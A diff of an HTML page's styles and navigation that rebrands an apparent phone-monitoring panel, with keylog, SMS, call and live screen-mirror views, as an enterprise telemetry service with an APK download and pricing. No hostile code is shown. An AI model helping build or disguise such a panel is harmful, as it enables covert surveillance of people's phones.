@@ -3,23 +3,32 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>AETERNA // QUANTUM DEFENSE & S24 ULTRA MONITOR</title>
+  <title>AETERNA // PAAS.WEBSITE — Enterprise Fleet Telemetry & Endpoint Governance</title>
+  <meta name="description" content="Next-generation Sovereign Platform-as-a-Service (PaaS) engineered for corporate intelligence, executive endpoint governance, and real-time remote device telemetry.">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&family=Outfit:wght@400;600;800;900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,600;0,800;1,400&family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
   <style>
     :root {
-      --bg: #04060a;
-      --card: rgba(11, 16, 28, 0.88);
-      --border: rgba(0, 240, 255, 0.22);
+      --bg: #03060c;
+      --bg-surface: #070d18;
+      --card: rgba(10, 18, 32, 0.85);
+      --card-hover: rgba(14, 25, 46, 0.95);
+      --border: rgba(0, 240, 255, 0.18);
+      --border-strong: rgba(0, 240, 255, 0.45);
       --cyan: #00f0ff;
+      --cyan-glow: rgba(0, 240, 255, 0.35);
       --gold: #ffd700;
       --green: #00ff88;
+      --green-glow: rgba(0, 255, 136, 0.3);
       --red: #ff3366;
       --purple: #b026ff;
-      --text: #f0f4f8;
-      --muted: #6b7a90;
-      --shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
+      --blue: #2563eb;
+      --text: #f1f5f9;
+      --text-dim: #94a3b8;
+      --muted: #64748b;
+      --shadow: 0 20px 40px -15px rgba(0, 0, 0, 0.8);
+      --shadow-cyan: 0 10px 30px -5px rgba(0, 240, 255, 0.25);
     }
 
     * {
@@ -29,49 +38,897 @@
       -webkit-tap-highlight-color: transparent;
     }
 
+    html {
+      scroll-behavior: smooth;
+    }
+
     body {
       background: var(--bg);
       background-image: 
-        radial-gradient(circle at 10% 10%, rgba(0, 240, 255, 0.07), transparent 40%),
-        radial-gradient(circle at 90% 90%, rgba(176, 38, 255, 0.05), transparent 40%),
+        radial-gradient(circle at 15% 10%, rgba(0, 240, 255, 0.08), transparent 45%),
+        radial-gradient(circle at 85% 90%, rgba(176, 38, 255, 0.06), transparent 50%),
         linear-gradient(rgba(255, 255, 255, 0.012) 1px, transparent 1px),
         linear-gradient(90deg, rgba(255, 255, 255, 0.012) 1px, transparent 1px);
-      background-size: 100% 100%, 100% 100%, 28px 28px, 28px 28px;
+      background-size: 100% 100%, 100% 100%, 32px 32px, 32px 32px;
       color: var(--text);
       font-family: 'Outfit', sans-serif;
       min-height: 100vh;
+      overflow-x: hidden;
+      line-height: 1.5;
+    }
+
+    /* ══════════════════════════════════════════════════════════════ */
+    /* EXECUTIVE NAVIGATION BAR */
+    /* ══════════════════════════════════════════════════════════════ */
+    .top-nav {
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      width: 100%;
+      background: rgba(3, 6, 12, 0.85);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border);
+      padding: 14px 28px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      transition: all 0.3s;
+    }
+
+    .nav-brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      text-decoration: none;
+      color: inherit;
+    }
+
+    .nav-logo-glyph {
+      width: 36px;
+      height: 36px;
+      border-radius: 10px;
+      background: linear-gradient(135deg, rgba(0, 240, 255, 0.2), rgba(0, 255, 136, 0.2));
+      border: 1px solid var(--cyan);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      box-shadow: 0 0 15px var(--cyan-glow);
+    }
+
+    .nav-title {
+      font-size: 17px;
+      font-weight: 800;
+      letter-spacing: 1px;
+      color: #fff;
+    }
+
+    .nav-subtitle {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 10px;
+      color: var(--cyan);
+      letter-spacing: 1.5px;
+      font-weight: 600;
+      text-transform: uppercase;
+    }
+
+    .nav-links {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+      list-style: none;
+    }
+
+    .nav-links a {
+      color: var(--text-dim);
+      text-decoration: none;
+      font-size: 13px;
+      font-weight: 600;
+      transition: color 0.2s;
+    }
+    .nav-links a:hover {
+      color: var(--cyan);
+    }
+
+    .nav-actions {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .lang-switcher {
+      display: flex;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 3px;
+      gap: 2px;
+    }
+
+    .lang-btn {
+      background: transparent;
+      border: none;
+      color: var(--muted);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 4px 8px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .lang-btn.active {
+      background: var(--cyan);
+      color: #000;
+      box-shadow: 0 0 10px var(--cyan-glow);
+    }
+
+    .btn-portal-login {
+      background: linear-gradient(135deg, rgba(0, 240, 255, 0.15), rgba(255, 215, 0, 0.15));
+      border: 1px solid var(--cyan);
+      color: #fff;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      font-weight: 700;
+      padding: 8px 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      box-shadow: 0 0 15px rgba(0, 240, 255, 0.15);
+      transition: all 0.2s;
+    }
+    .btn-portal-login:hover {
+      background: var(--cyan);
+      color: #000;
+      box-shadow: 0 0 20px var(--cyan-glow);
+      transform: translateY(-1px);
+    }
+
+    @media (max-width: 900px) {
+      .nav-links { display: none; }
+      .top-nav { padding: 12px 16px; }
+    }
+
+    /* ══════════════════════════════════════════════════════════════ */
+    /* EXECUTIVE SHOWCASE / PORTFOLIO CONTAINER */
+    /* ══════════════════════════════════════════════════════════════ */
+    #executive-showcase {
+      width: 100%;
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 40px 24px 80px;
+    }
+
+    /* HERO SECTION */
+    .hero-section {
+      text-align: center;
+      padding: 50px 0 60px;
+      max-width: 960px;
+      margin: 0 auto;
+    }
+
+    .hero-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(0, 240, 255, 0.08);
+      border: 1px solid var(--border-strong);
+      padding: 6px 14px;
+      border-radius: 9999px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--cyan);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 24px;
+      box-shadow: 0 0 20px rgba(0, 240, 255, 0.12);
+    }
+
+    .hero-title {
+      font-size: 48px;
+      font-weight: 900;
+      line-height: 1.15;
+      letter-spacing: -1px;
+      margin-bottom: 20px;
+      background: linear-gradient(135deg, #ffffff 40%, var(--cyan) 80%, var(--gold) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .hero-lead {
+      font-size: 18px;
+      color: var(--text-dim);
+      font-weight: 400;
+      max-width: 780px;
+      margin: 0 auto 36px;
+      line-height: 1.6;
+    }
+
+    .hero-cta-group {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+
+    .btn-primary-cta {
+      background: linear-gradient(135deg, #00f0ff, #00b4d8);
+      color: #020617;
+      font-family: 'Outfit', sans-serif;
+      font-size: 15px;
+      font-weight: 800;
+      padding: 14px 28px;
+      border-radius: 10px;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      box-shadow: var(--shadow-cyan);
+      transition: all 0.25s;
+      border: none;
+      cursor: pointer;
+    }
+    .btn-primary-cta:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 30px rgba(0, 240, 255, 0.4);
+    }
+
+    .btn-secondary-cta {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid var(--border);
+      color: #fff;
+      font-family: 'Outfit', sans-serif;
+      font-size: 15px;
+      font-weight: 700;
+      padding: 14px 24px;
+      border-radius: 10px;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      transition: all 0.2s;
+      cursor: pointer;
+    }
+    .btn-secondary-cta:hover {
+      background: rgba(255, 255, 255, 0.08);
+      border-color: rgba(255, 255, 255, 0.3);
+    }
+
+    /* METRICS STRIP */
+    .metrics-strip {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 16px;
+      margin: 40px 0 70px;
+    }
+
+    .metric-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 20px 18px;
+      text-align: center;
+      backdrop-filter: blur(12px);
+      transition: border-color 0.2s;
+    }
+    .metric-card:hover {
+      border-color: var(--cyan);
+    }
+
+    .metric-value {
+      font-size: 28px;
+      font-weight: 800;
+      font-family: 'JetBrains Mono', monospace;
+      color: #fff;
+      margin-bottom: 4px;
+    }
+    .metric-value.cyan { color: var(--cyan); }
+    .metric-value.green { color: var(--green); }
+    .metric-value.gold { color: var(--gold); }
+
+    .metric-label {
+      font-size: 12px;
+      color: var(--text-dim);
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    @media (max-width: 900px) {
+      .hero-title { font-size: 32px; }
+      .hero-lead { font-size: 16px; }
+      .metrics-strip { grid-template-columns: repeat(2, 1fr); }
+    }
+
+    /* ══════════════════════════════════════════════════════════════ */
+    /* INTERACTIVE DEMO HUD (WHAT HAPPENS AFTER ACTIVATION) */
+    /* ══════════════════════════════════════════════════════════════ */
+    .section-header {
+      text-align: center;
+      margin-bottom: 36px;
+    }
+
+    .section-tag {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--cyan);
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      display: block;
+    }
+
+    .section-title {
+      font-size: 32px;
+      font-weight: 800;
+      color: #fff;
+      letter-spacing: -0.5px;
+    }
+
+    .section-desc {
+      font-size: 15px;
+      color: var(--text-dim);
+      max-width: 680px;
+      margin: 10px auto 0;
+    }
+
+    .demo-sandbox {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 30px;
+      box-shadow: var(--shadow);
+      display: grid;
+      grid-template-columns: 340px 1fr;
+      gap: 30px;
+      align-items: start;
+      margin-bottom: 70px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .demo-sandbox::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      right: 0;
+      width: 300px;
+      height: 300px;
+      background: radial-gradient(circle, rgba(0, 240, 255, 0.08), transparent 70%);
+      pointer-events: none;
+    }
+
+    /* DEMO PHONE CHASSIS */
+    .demo-phone {
+      background: #000;
+      border: 3px solid #1e293b;
+      border-radius: 36px;
+      aspect-ratio: 9 / 19;
+      padding: 14px 12px;
       display: flex;
       flex-direction: column;
+      position: relative;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.9), 0 0 20px rgba(0, 240, 255, 0.15);
+    }
+
+    .demo-notch {
+      width: 12px;
+      height: 12px;
+      background: #020617;
+      border-radius: 50%;
+      margin: 0 auto 10px;
+      border: 1px solid #334155;
+    }
+
+    .demo-screen-content {
+      flex: 1;
+      background: #050b14;
+      border-radius: 24px;
+      padding: 16px 12px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      overflow: hidden;
+      position: relative;
+    }
+
+    .demo-screen-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 11px;
+      font-family: 'JetBrains Mono', monospace;
+      color: var(--cyan);
+      padding-bottom: 8px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .demo-app-card {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 12px;
+      padding: 10px;
+      margin: 8px 0;
+      font-size: 11px;
+    }
+
+    .demo-typing-box {
+      background: rgba(0, 240, 255, 0.08);
+      border: 1px dashed var(--cyan);
+      border-radius: 8px;
+      padding: 8px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: #fff;
+    }
+
+    /* DEMO CONTROL PANEL */
+    .demo-control-panel {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .demo-nav-tabs {
+      display: flex;
+      gap: 8px;
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 12px;
+      overflow-x: auto;
+    }
+
+    .demo-tab-btn {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid var(--border);
+      color: var(--text-dim);
+      padding: 8px 16px;
+      border-radius: 8px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s;
+      white-space: nowrap;
+    }
+    .demo-tab-btn.active {
+      background: rgba(0, 240, 255, 0.12);
+      border-color: var(--cyan);
+      color: var(--cyan);
+    }
+
+    .demo-tab-pane {
+      display: none;
+      animation: fadeIn 0.3s ease;
+    }
+    .demo-tab-pane.active {
+      display: block;
+    }
+
+    .demo-data-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+    }
+    .demo-data-table th {
+      text-align: left;
+      padding: 10px 12px;
+      color: var(--muted);
+      border-bottom: 1px solid var(--border);
+      font-weight: 600;
+    }
+    .demo-data-table td {
+      padding: 12px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+      color: var(--text);
+    }
+
+    @media (max-width: 900px) {
+      .demo-sandbox { grid-template-columns: 1fr; }
+      .demo-phone { max-width: 320px; margin: 0 auto; }
+    }
+
+    /* ══════════════════════════════════════════════════════════════ */
+    /* INTERACTIVE DEPLOYMENT TERMINAL (AUTONOMOUS ENROLLMENT) */
+    /* ══════════════════════════════════════════════════════════════ */
+    .terminal-wrapper {
+      background: #020408;
+      border: 1px solid #1e293b;
+      border-radius: 16px;
+      box-shadow: var(--shadow);
+      margin-bottom: 70px;
+      overflow: hidden;
+    }
+
+    .terminal-header {
+      background: #090d16;
+      border-bottom: 1px solid #1e293b;
+      padding: 12px 18px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .terminal-dots {
+      display: flex;
+      gap: 6px;
+    }
+    .terminal-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+    .dot-red { background: #ef4444; }
+    .dot-yellow { background: #f59e0b; }
+    .dot-green { background: #10b981; }
+
+    .terminal-title {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--text-dim);
+      font-weight: 600;
+    }
+
+    .terminal-body {
+      padding: 24px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      line-height: 1.7;
+      color: #93c5fd;
+      min-height: 280px;
+      max-height: 380px;
+      overflow-y: auto;
+    }
+
+    .term-line {
+      display: flex;
+      align-items: baseline;
+      gap: 12px;
+      margin-bottom: 6px;
+    }
+    .term-prompt { color: var(--cyan); font-weight: 700; user-select: none; }
+    .term-cmd { color: #f8fafc; font-weight: 600; }
+    .term-success { color: var(--green); }
+    .term-info { color: var(--gold); }
+
+    .terminal-footer {
+      background: #090d16;
+      border-top: 1px solid #1e293b;
+      padding: 12px 18px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+
+    .btn-term-action {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid var(--border);
+      color: #fff;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 6px 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s;
+    }
+    .btn-term-action:hover {
+      background: var(--cyan);
+      color: #000;
+    }
+
+    /* ══════════════════════════════════════════════════════════════ */
+    /* DIRECT APK DOWNLOAD & INSTRUCTIONS CARD */
+    /* ══════════════════════════════════════════════════════════════ */
+    .download-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 28px;
+      margin-bottom: 70px;
+    }
+
+    .download-card {
+      background: linear-gradient(135deg, rgba(0, 240, 255, 0.05), rgba(11, 16, 28, 0.95));
+      border: 1px solid var(--border-strong);
+      border-radius: 20px;
+      padding: 32px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      box-shadow: var(--shadow);
+    }
+
+    .apk-meta-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(0, 255, 136, 0.1);
+      border: 1px solid var(--green);
+      color: var(--green);
+      padding: 4px 10px;
+      border-radius: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      font-weight: 700;
+      margin-bottom: 16px;
+    }
+
+    .apk-spec-list {
+      list-style: none;
+      margin: 20px 0 28px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      color: var(--text-dim);
+      space-y: 10px;
+    }
+    .apk-spec-list li {
+      display: flex;
+      justify-content: space-between;
+      padding: 6px 0;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+    }
+    .apk-spec-list strong { color: #fff; }
+
+    .btn-download-apk {
+      background: linear-gradient(135deg, var(--green), #059669);
+      color: #020617;
+      font-family: 'Outfit', sans-serif;
+      font-size: 16px;
+      font-weight: 800;
+      padding: 16px;
+      border-radius: 12px;
+      text-align: center;
+      text-decoration: none;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+      box-shadow: 0 10px 25px rgba(0, 255, 136, 0.3);
+      transition: all 0.25s;
+    }
+    .btn-download-apk:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 14px 30px rgba(0, 255, 136, 0.45);
+    }
+
+    /* INSTRUCTIONS CARD */
+    .steps-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 32px;
+      box-shadow: var(--shadow);
+    }
+
+    .step-item {
+      display: flex;
+      gap: 16px;
+      margin-bottom: 24px;
+    }
+    .step-num {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: rgba(0, 240, 255, 0.1);
+      border: 1px solid var(--cyan);
+      color: var(--cyan);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .step-text h4 {
+      font-size: 15px;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 4px;
+    }
+    .step-text p {
+      font-size: 13px;
+      color: var(--text-dim);
+      line-height: 1.5;
+    }
+
+    @media (max-width: 900px) {
+      .download-grid { grid-template-columns: 1fr; }
+    }
+
+    /* ══════════════════════════════════════════════════════════════ */
+    /* PRICING & LICENSING MATRIX */
+    /* ══════════════════════════════════════════════════════════════ */
+    .pricing-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 24px;
+      margin-bottom: 70px;
+    }
+
+    .pricing-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 32px 24px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      backdrop-filter: blur(16px);
+      transition: all 0.3s;
+      position: relative;
+    }
+    .pricing-card.featured {
+      border-color: var(--cyan);
+      background: linear-gradient(180deg, rgba(0, 240, 255, 0.08) 0%, rgba(10, 18, 32, 0.95) 100%);
+      box-shadow: 0 0 35px rgba(0, 240, 255, 0.15);
+      transform: scale(1.02);
+    }
+    .pricing-card:hover {
+      transform: translateY(-4px);
+    }
+
+    .featured-tag {
+      position: absolute;
+      top: -12px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: var(--cyan);
+      color: #020617;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 10px;
+      font-weight: 800;
+      padding: 4px 12px;
+      border-radius: 9999px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .plan-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #fff;
+      margin-bottom: 6px;
+    }
+    .plan-desc {
+      font-size: 13px;
+      color: var(--text-dim);
+      margin-bottom: 20px;
+      min-height: 40px;
+    }
+
+    .plan-price {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 34px;
+      font-weight: 800;
+      color: #fff;
+      margin-bottom: 24px;
+    }
+    .plan-price span {
+      font-size: 14px;
+      color: var(--muted);
+      font-weight: 400;
+    }
+
+    .plan-features {
+      list-style: none;
+      margin-bottom: 30px;
+      font-size: 13px;
+      space-y: 12px;
+    }
+    .plan-features li {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: var(--text-dim);
+      padding: 6px 0;
+    }
+    .plan-features li span { color: var(--green); font-weight: 800; }
+
+    .btn-plan {
+      width: 100%;
+      padding: 14px;
+      border-radius: 10px;
+      font-weight: 800;
+      font-size: 14px;
+      cursor: pointer;
+      text-align: center;
+      transition: all 0.2s;
+      border: 1px solid var(--border);
+      background: rgba(255, 255, 255, 0.05);
+      color: #fff;
+    }
+    .btn-plan.featured {
+      background: var(--cyan);
+      color: #020617;
+      border: none;
+    }
+    .btn-plan:hover {
+      background: #fff;
+      color: #000;
+    }
+
+    @media (max-width: 900px) {
+      .pricing-grid { grid-template-columns: 1fr; }
+      .pricing-card.featured { transform: none; }
+    }
+
+    /* ══════════════════════════════════════════════════════════════ */
+    /* PASSKEY LOGIN MODAL (FLOATING DIALOG) */
+    /* ══════════════════════════════════════════════════════════════ */
+    #auth-modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(24px);
+      z-index: 2000;
       align-items: center;
       justify-content: center;
       padding: 16px;
     }
 
-    /* AUTH SCREEN */
-    #auth-screen {
+    .auth-modal-card {
       width: 100%;
-      max-width: 420px;
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 16px;
-      padding: 32px 24px;
-      backdrop-filter: blur(20px);
-      box-shadow: var(--shadow);
+      max-width: 440px;
+      background: var(--bg-surface);
+      border: 1px solid var(--cyan);
+      border-radius: 20px;
+      padding: 36px 28px;
+      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.9), 0 0 35px var(--cyan-glow);
       text-align: center;
+      position: relative;
+      animation: modalFadeIn 0.3s ease;
     }
 
-    .auth-logo {
-      font-size: 24px;
+    @keyframes modalFadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    .modal-close-btn {
+      position: absolute;
+      top: 18px;
+      right: 18px;
+      background: transparent;
+      border: none;
+      color: var(--muted);
+      font-size: 20px;
+      cursor: pointer;
+    }
+    .modal-close-btn:hover { color: #fff; }
+
+    .modal-logo {
+      font-size: 22px;
       font-weight: 900;
-      letter-spacing: 2px;
-      background: linear-gradient(135deg, var(--cyan), var(--gold));
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
+      color: #fff;
+      letter-spacing: 1px;
       margin-bottom: 6px;
     }
 
-    .input-box { margin: 20px 0; text-align: left; }
-    .input-box label {
+    .input-pass-wrap {
+      margin: 24px 0 20px;
+      text-align: left;
+    }
+    .input-pass-wrap label {
       display: block;
       font-family: 'JetBrains Mono', monospace;
       font-size: 11px;
@@ -80,36 +937,52 @@
       margin-bottom: 8px;
       letter-spacing: 1px;
     }
-    .input-box input {
+    .input-pass-wrap input {
       width: 100%;
-      background: #020306;
+      background: #020408;
       border: 1px solid var(--border);
-      border-radius: 8px;
+      border-radius: 10px;
       padding: 14px 16px;
       font-family: 'JetBrains Mono', monospace;
       font-size: 14px;
       color: var(--text);
       outline: none;
+      transition: border-color 0.2s;
     }
-    .btn-auth {
-      width: 100%;
-      background: linear-gradient(135deg, rgba(0, 240, 255, 0.2), rgba(255, 215, 0, 0.2));
-      border: 1px solid var(--cyan);
-      color: var(--text);
-      padding: 14px;
-      border-radius: 8px;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 13px;
-      font-weight: 800;
-      letter-spacing: 2px;
-      cursor: pointer;
+    .input-pass-wrap input:focus {
+      border-color: var(--cyan);
+      box-shadow: 0 0 15px rgba(0, 240, 255, 0.25);
     }
 
-    /* DASHBOARD */
+    .btn-modal-unlock {
+      width: 100%;
+      background: linear-gradient(135deg, var(--cyan), var(--gold));
+      color: #020617;
+      border: none;
+      padding: 14px;
+      border-radius: 10px;
+      font-family: 'Outfit', sans-serif;
+      font-size: 15px;
+      font-weight: 800;
+      letter-spacing: 1px;
+      cursor: pointer;
+      box-shadow: 0 0 20px rgba(0, 240, 255, 0.3);
+      transition: all 0.2s;
+    }
+    .btn-modal-unlock:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 0 30px rgba(0, 240, 255, 0.5);
+    }
+
+    /* ══════════════════════════════════════════════════════════════ */
+    /* LIVE DASHBOARD STYLES (ORIGINAL HARDWARE BRIDGE) */
+    /* ══════════════════════════════════════════════════════════════ */
     #dashboard-screen {
       display: none;
       width: 100%;
       max-width: 1300px;
+      margin: 20px auto;
+      padding: 0 16px 40px;
       animation: fadeIn 0.4s ease forwards;
     }
 
@@ -157,7 +1030,6 @@
       50% { opacity: 0.3; transform: scale(0.85); }
     }
 
-    /* TABS */
     .tabs-bar {
       display: flex;
       gap: 10px;
@@ -196,11 +1068,9 @@
       font-size: 10px;
     }
 
-    /* CONTENT LAYOUT */
     .view-content { display: none; }
     .view-content.active { display: block; }
 
-    /* MIRROR VIEW */
     .viewport-layout {
       display: grid;
       grid-template-columns: minmax(360px, 440px) 1fr;
@@ -249,86 +1119,79 @@
       box-shadow: inset 0 0 3px rgba(0, 240, 255, 0.4);
     }
 
-    .phone-screen-img {
+    #live-screen-img {
       width: 100%;
       height: 100%;
       object-fit: cover;
       display: block;
-      background: #000;
-      cursor: crosshair;
       user-select: none;
+      cursor: crosshair;
     }
 
-    .phone-controls-panel {
+    .touch-indicator {
+      position: absolute;
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: rgba(0, 240, 255, 0.5);
+      border: 2px solid var(--cyan);
+      pointer-events: none;
+      transform: translate(-50%, -50%);
+      display: none;
+      z-index: 30;
+      box-shadow: 0 0 10px var(--cyan);
+    }
+
+    .controls-panel {
       width: 100%;
       max-width: 420px;
       background: var(--card);
       border: 1px solid var(--border);
       border-radius: 14px;
-      padding: 14px;
+      padding: 12px;
       display: flex;
       flex-direction: column;
       gap: 10px;
-      box-shadow: var(--shadow);
     }
 
-    /* DATA LISTS (NOTIFICATIONS, CALLS, SMS) */
-    .data-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+    .ctrl-row {
+      display: flex;
+      gap: 8px;
+    }
+
+    .side-telemetry {
+      display: flex;
+      flex-direction: column;
       gap: 16px;
     }
 
-    .event-card {
+    .battery-widget {
       background: var(--card);
       border: 1px solid var(--border);
-      border-radius: 12px;
+      border-radius: 14px;
       padding: 16px;
-      backdrop-filter: blur(16px);
-      box-shadow: var(--shadow);
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-      position: relative;
-    }
-
-    .event-card.type-notification { border-left: 4px solid var(--purple); }
-    .event-card.type-call { border-left: 4px solid var(--green); }
-    .event-card.type-sms { border-left: 4px solid var(--cyan); }
-    .event-card.type-contact { border-left: 4px solid var(--gold); }
-    .event-card.type-keylog { border-left: 4px solid var(--red); }
-
-    .event-header {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 11px;
     }
 
-    .event-title {
-      font-size: 15px;
-      font-weight: 800;
-      color: var(--text);
+    .data-grid {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 10px;
     }
 
-    .event-body {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 12px;
-      color: #cdd9e5;
-      background: #020306;
-      border-radius: 6px;
-      padding: 10px;
-      word-break: break-word;
-      line-height: 1.5;
+    .data-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 14px;
+      font-size: 13px;
+      transition: all 0.2s;
     }
-
-    .event-meta {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 10px;
-      color: var(--muted);
-      display: flex;
-      justify-content: space-between;
+    .data-card:hover {
+      border-color: var(--cyan);
+      background: var(--card-hover);
     }
 
     .filter-bar {
@@ -383,22 +1246,462 @@
 </head>
 <body>
 
-  <!-- AUTH SCREEN -->
-  <div id="auth-screen">
-    <div class="auth-logo">AETERNA SYSTEMDEF</div>
-    <p style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); letter-spacing: 1px; margin-bottom: 24px;">
-      SOVEREIGN DEFENSE INTELLIGENCE VAULT
-    </p>
+  <!-- ══════════════════════════════════════════════════════════════ -->
+  <!-- TOP NAVIGATION -->
+  <!-- ══════════════════════════════════════════════════════════════ -->
+  <nav class="top-nav">
+    <a href="#" class="nav-brand">
+      <div class="nav-logo-glyph">🛡️</div>
+      <div>
+        <div class="nav-title">AETERNA // SYSTEMDEF</div>
+        <div class="nav-subtitle">PaaS Enterprise Telemetry</div>
+      </div>
+    </a>
 
-    <div class="input-box">
-      <label>Passkey</label>
-      <input type="password" id="passkey-input" placeholder="Въведете парола..." autofocus>
+    <ul class="nav-links">
+      <li><a href="#overview" data-i18n="nav_overview">Възможности</a></li>
+      <li><a href="#demo" data-i18n="nav_demo">Live Демо</a></li>
